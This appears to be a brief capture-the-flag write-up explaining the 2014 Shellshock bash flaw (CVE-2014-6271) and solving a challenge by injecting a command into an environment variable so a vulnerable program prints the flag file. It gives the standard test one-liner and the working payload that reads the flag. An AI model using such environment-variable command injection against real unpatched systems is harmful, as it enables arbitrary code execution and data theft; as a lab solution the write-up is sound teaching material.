shellock! the concept of shellshock is:

env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

vulnerable
this is a test

this will be printed when using the bugged shell version (from 2014) -> running the arbitrary code placed after the function declaration inside the env var

in our case we want to set a env var and the vulnerability to cat the flag file.
the way to pass a env var as a arg when executing a file is as follows: VAR=blahblah ./file/path/

so solution is: VULN='() { :;};cat flag' ./shellshock

this gives us the flag:
only if I knew CVE-2014-6271 ten years ago..!!
